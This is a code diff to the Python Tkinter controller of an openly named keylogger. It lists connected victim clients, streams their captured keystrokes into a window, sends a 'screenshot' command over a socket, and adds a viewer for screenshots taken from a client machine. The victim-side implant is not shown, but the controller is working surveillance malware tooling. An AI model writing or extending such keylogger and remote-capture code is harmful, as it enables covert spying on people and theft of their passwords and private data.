@@ -5,10 +5,12 @@ import server
 import cv2
 from PIL import Image, ImageTk
 import numpy as np
+import os
 import time
 import queue
 
 selected_client = None
+
 
 # Function to start the server.
 def start_server():
@@ -16,23 +18,25 @@ def start_server():
     server_thread = threading.Thread(target=server.start_server, args=(update_clients_list,))
     server_thread.start()
 
+
 # Function to close the server.
 def close_server():
     server.stop_server()
 
+
+# Function to send commands to a selected client.
 def send_command(command, client):
     if client:
-        print(f"Selected client: {client}")
         client_socket = server.client_sockets.get(client)
         if client_socket:
-            print(f"Sending command to {client}: {command}")
             client_socket.sendall(command.encode())
         else:
             print(f"No socket found for client: {client}")
     else:
         print("No client selected")
 
-# Function to update the list of connected clients.
+
+# Function to update the list of connected clients in the GUI.
 def update_clients_list(clients):
     for widget in clients_frame.winfo_children():
         widget.destroy()
@@ -41,10 +45,10 @@ def update_clients_list(clients):
         client_label = tk.Label(client_frame, text=f"{client[0]}:{client[1]}", bg="#333333", fg="#ffffff", font=('Helvetica', 12))
 
         connect_button = ttk.Button(client_frame, text="See Keypress", command=lambda c=client: open_client_window(c))
-
         client_label.pack(side=tk.LEFT, padx=5)
         connect_button.pack(side=tk.RIGHT, padx=5)
         client_frame.pack(fill=tk.X, pady=5)
+
 
 # Function to open a new window for the selected client.
 def open_client_window(client):
@@ -58,7 +62,6 @@ def open_client_window(client):
 
     screenshot_button = ttk.Button(client_window, text="Take Screenshot", command=lambda: send_command("screenshot", client))
     screenshot_button.pack(pady=10)
-    
 
     text_widget = tk.Text(client_window, width=80, height=20, bg="#222222", fg="#ffffff", font=('Helvetica', 12))
     text_widget.pack(pady=10)
@@ -67,7 +70,7 @@ def open_client_window(client):
         last_keypress_time = time.time()
         while True:
             try:
-                keypress = server.keypress_queues[client].get(timeout=5)
+                keypress = server.message_queues[client].get(timeout=5)
                 text_widget.insert(tk.END, keypress)
                 text_widget.see(tk.END)
                 last_keypress_time = time.time()
@@ -79,9 +82,33 @@ def open_client_window(client):
 
     threading.Thread(target=update_keypresses, daemon=True).start()
 
+    # Button to show the screenshot in a new window
+    show_image_button = ttk.Button(client_window, text="Show Screenshot", command=lambda: display_screenshot(client))
+    show_image_button.pack(pady=10)
+
+
+# Function to display the screenshot in a new window
+def display_screenshot(client):
+    # Check if the screenshot file exists
+    image_filename = f"{client[0]}_screenshot.jpg"
+    if os.path.exists(image_filename):
+        image_window = tk.Toplevel(root)
+        image_window.title(f"Screenshot from {client[0]}")
+
+        # Load and display the image using PIL
+        image = Image.open(image_filename)
+        image = ImageTk.PhotoImage(image)
+        image_label = tk.Label(image_window, image=image)
+        image_label.image = image  # Keep a reference to prevent garbage collection
+        image_label.pack()
+
+    else:
+        print(f"No screenshot found for {client[0]}")
+
+
 # Create the GUI.
 root = tk.Tk()
-root.title("Keylogger")
+root.title("Keylogger Server")
 root.geometry("400x400")  # Set the window size
 
 # Apply dark theme
